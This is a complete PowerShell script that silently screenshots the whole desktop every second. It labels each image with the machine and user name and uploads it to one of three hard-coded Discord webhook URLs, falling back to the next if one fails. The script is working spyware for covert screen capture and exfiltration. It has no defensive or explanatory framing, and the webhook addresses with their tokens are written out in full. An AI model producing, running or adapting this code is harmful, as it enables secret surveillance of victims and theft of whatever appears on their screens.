Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$webhooks = @(
    "https://discord.com/api/webhooks/1425587259931103372/ERbso33oOlKGOHOOl5Uz2A53SQNhw6z_JJ7LUcqkCMgWOXdyfP1stv7iDMhj_KU5P_Rk",
    "https://discord.com/api/webhooks/1425587336523022376/KznffSg0LN3oHTlz9CfCS4XL51RuduEB5rdDGUtjlIbzdhxuBn8ucO5r5gnOBV3uFXEs",
    "https://discord.com/api/webhooks/1425587377715548241/wjietEr8_yHzsCXjtAjDSUBIzgetVCuCVws8nRDH0pJfxGJvGaMzfFXhyLk0fyQdg8tz"
)

$tempDir = Join-Path $env:TEMP "screenshots"
if (-not (Test-Path $tempDir)) {
    New-Item -Path $tempDir -ItemType Directory | Out-Null
}

$username = "$($env:COMPUTERNAME) | $($env:USERNAME)"

while ($true) {
    $bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)

    $filePath = Join-Path $tempDir "VirtualScreen.jpg"
    $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Jpeg)

    $graphics.Dispose()
    $bitmap.Dispose()

    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
    $fileName = [System.IO.Path]::GetFileName($filePath)

    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"

    $payload = @{
        username = $username
    } | ConvertTo-Json -Compress

    $bodyPrefix = (
        "--$boundary$LF" +
        "Content-Disposition: form-data; name=`"payload_json`"$LF$LF" +
        "$payload$LF" +
        "--$boundary$LF" +
        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"$LF" +
        "Content-Type: application/octet-stream$LF$LF"
    )

    $bodyPrefixBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyPrefix)
    $bodySuffixBytes = [System.Text.Encoding]::UTF8.GetBytes("$LF--$boundary--$LF")

    $bodyBytes = New-Object byte[] ($bodyPrefixBytes.Length + $fileBytes.Length + $bodySuffixBytes.Length)
    [Array]::Copy($bodyPrefixBytes, 0, $bodyBytes, 0, $bodyPrefixBytes.Length)
    [Array]::Copy($fileBytes, 0, $bodyBytes, $bodyPrefixBytes.Length, $fileBytes.Length)
    [Array]::Copy($bodySuffixBytes, 0, $bodyBytes, $bodyPrefixBytes.Length + $fileBytes.Length, $bodySuffixBytes.Length)

    $headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }

    $sent = $false
    foreach ($webhook in $webhooks) {
        try {
            Invoke-RestMethod -Uri $webhook -Method Post -Body $bodyBytes -Headers $headers -TimeoutSec 1.5
            $sent = $true
            break
        } catch {
            Write-Host "Failed sending to $webhook, trying next..."
        }
    }

    if (-not $sent) { Write-Host "All webhooks failed for this frame." }

    Start-Sleep -Seconds 1
}
